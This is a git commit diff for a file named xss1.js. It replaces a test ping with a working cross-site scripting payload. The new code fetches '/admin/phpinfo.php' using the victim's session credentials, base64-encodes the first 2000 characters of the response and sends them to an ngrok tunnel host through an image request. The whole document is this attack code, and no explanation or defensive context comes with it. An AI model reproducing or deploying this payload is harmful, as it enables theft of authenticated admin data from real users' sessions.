bfbfe9a3f3c4cbcc676e9602ae778676d7218d3a
glno815 <78334532+glno815@users.noreply.github.com>
2026-03-16 21:51:25 +0700

    Update xss1.js

--- xss1.js
+++ xss1.js
@@ -1,1 +1,6 @@
-new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app?ping=test";
+fetch('/admin/phpinfo.php', {credentials:'include'})
+.then(r=>r.text())
+.then(d=>{
+    d = d.slice(0,2000);
+    new Image().src="https://30a8-2402-800-61c7-539d-60ad-28f0-6942-5ea2.ngrok-free.app/?d="+encodeURIComponent(btoa(d));
+});
